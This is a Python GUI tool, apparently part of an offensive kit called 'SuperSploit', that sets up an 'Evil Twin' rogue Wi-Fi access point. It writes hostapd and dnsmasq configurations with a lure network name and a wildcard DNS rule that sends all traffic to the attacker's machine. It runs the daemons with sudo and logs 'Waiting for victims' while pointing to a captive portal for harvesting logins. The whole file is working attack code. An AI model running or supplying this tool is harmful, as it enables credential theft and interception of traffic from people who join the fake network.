import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import subprocess
import os
import time

class EvilTwinGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SuperSploit Evil Twin - ROGUE AP DEPLOYMENT")
        self.root.geometry("700x600")
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.is_running = False
        self.procs = []
        
        self._build_ui()

    def _build_ui(self):
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # AP Config
        config_frame = ttk.LabelFrame(main_frame, text=" 📡 Access Point Configuration ", padding="10")
        config_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(config_frame, text="Interface:").grid(row=0, column=0, sticky=tk.W)
        self.iface = ttk.Entry(config_frame, width=20)
        self.iface.insert(0, "wlan1")
        self.iface.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(config_frame, text="Rogue SSID:").grid(row=0, column=2, sticky=tk.W)
        self.ssid = ttk.Entry(config_frame, width=30)
        self.ssid.insert(0, "Free Public WiFi")
        self.ssid.grid(row=0, column=3, padx=5)

        # Action Buttons
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.start_btn = ttk.Button(btn_frame, text="🟢 START EVIL TWIN", command=self._start_ap)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="🔴 STOP EVIL TWIN", command=self._stop_ap, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        # Console
        log_frame = ttk.LabelFrame(main_frame, text=" 🖥️ AP Telemetry Console ", padding="5")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.console = scrolledtext.ScrolledText(log_frame, bg="black", fg="#00FF00", font=("Courier", 9))
        self.console.pack(fill=tk.BOTH, expand=True)

    def log(self, msg):
        self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.console.see(tk.END)

    def _start_ap(self):
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.is_running = True
        threading.Thread(target=self._run_daemons, daemon=True).start()

    def _stop_ap(self):
        self.is_running = False
        self.log("[*] Tearing down Rogue AP...")
        subprocess.run(["sudo", "killall", "dnsmasq", "hostapd"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "ifconfig", self.iface.get(), "down"])
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log("[+] Interface downed. AP Terminated.")

    def _run_daemons(self):
        ifc = self.iface.get()
        ssid_name = self.ssid.get()
        
        portal_dir = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "captive_portal")
        os.makedirs(portal_dir, exist_ok=True)
        h_conf = os.path.join(portal_dir, "hostapd.conf")
        d_conf = os.path.join(portal_dir, "dnsmasq.conf")

        with open(h_conf, "w") as f:
            f.write(f"interface={ifc}\ndriver=nl80211\nssid={ssid_name}\nhw_mode=g\nchannel=6\n")
        with open(d_conf, "w") as f:
            f.write(f"interface={ifc}\ndhcp-range=192.168.99.10,192.168.99.250,12h\ndhcp-option=3,192.168.99.1\naddress=/#/192.168.99.1\n")

        self.log(f"[*] Configuring {ifc} for 192.168.99.1...")
        subprocess.run(["sudo", "ifconfig", ifc, "up", "192.168.99.1", "netmask", "255.255.255.0"])
        subprocess.run(["sudo", "killall", "dnsmasq", "hostapd", "wpa_supplicant"], stderr=subprocess.DEVNULL)
        
        self.log("[*] Launching dnsmasq & hostapd...")
        d_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", d_conf, "-d"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        h_proc = subprocess.Popen(["sudo", "hostapd", h_conf], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        self.procs = [d_proc, h_proc]
        self.log(f"[+] Rogue AP '{ssid_name}' is LIVE! Waiting for victims...")
        self.log("[!] Ensure your captive portal web server is running on port 80.")

        def read_output(proc, prefix):
            for line in iter(proc.stdout.readline, ''):
                if not self.is_running: break
                if line.strip(): self.log(f"[{prefix}] {line.strip()}")

        threading.Thread(target=read_output, args=(d_proc, "DHCP/DNS"), daemon=True).start()
        threading.Thread(target=read_output, args=(h_proc, "WIFI"), daemon=True).start()
        
        d_proc.wait()
        h_proc.wait()

if __name__ == "__main__":
    root = tk.Tk()
    app = EvilTwinGUI(root)
    root.mainloop()